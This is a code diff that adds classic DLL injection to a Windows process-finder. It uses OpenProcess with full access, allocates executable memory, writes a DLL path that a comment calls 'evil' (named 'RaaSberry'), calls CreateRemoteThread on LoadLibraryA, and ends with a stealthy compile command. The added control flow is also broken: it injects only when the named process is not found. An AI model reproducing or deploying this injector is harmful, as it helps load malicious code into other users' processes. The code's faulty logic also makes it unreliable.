@@ -6,6 +6,9 @@
 #include <string.h>
 #include <tlhelp32.h>
 
+char RaaSDLL[] = "C:\\RaaSberry.dll";
+unsigned int RaaSLen = sizeof(RaaSDLL) + 1;
+
 // find process SYSTEM level process by process name
 int findProcess(const char *procname) {
     HANDLE hSnapshot;
@@ -46,10 +49,35 @@ int findProcess(const char *procname) {
 
 int main(int argc, char* argv[]) {
     int pid = 0; // process ID
+    HANDLE hProcess; // process handle
+    HANDLE hThread; // thread handle
+    LPVOID pRemoteBuf; // remote buffer
 
+    //handle to kernel32.dll and pass it to GetProcAddress
+    HMODULE hKernel32 = GetModuleHandle("Kernel32");
+    VOID *lpLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
+
+    // find process by name
     pid = findProcess(argv[1]);
     if (pid) {
         printf("Process %s is running with PID %d\n", argv[1], pid); // print process name and PID
+        return -1;
+    } else {
+        printf("Process %s is not running\n", argv[1]);
     }
+
+    // open process with all access
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
+    // allocate memory buffer for remote process
+    pRemoteBuf = VirtualAllocEx(hProcess, NULL, RaaSLen, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+    // "copy" evil DLL between processes
+    WriteProcessMemory(hProcess, pRemoteBuf, RaaSDLL, RaaSLen, NULL);
+    // process will start a new thread to load our DLL
+    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpLoadLibraryA, pRemoteBuf, 0, NULL);
+    // close handles
+    CloseHandle(hProcess);
     return 0;
+
+    // compile w/ x86_64-w64-mingw32-gcc -O2 <name>.cpp -o <name>.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1
+
 }
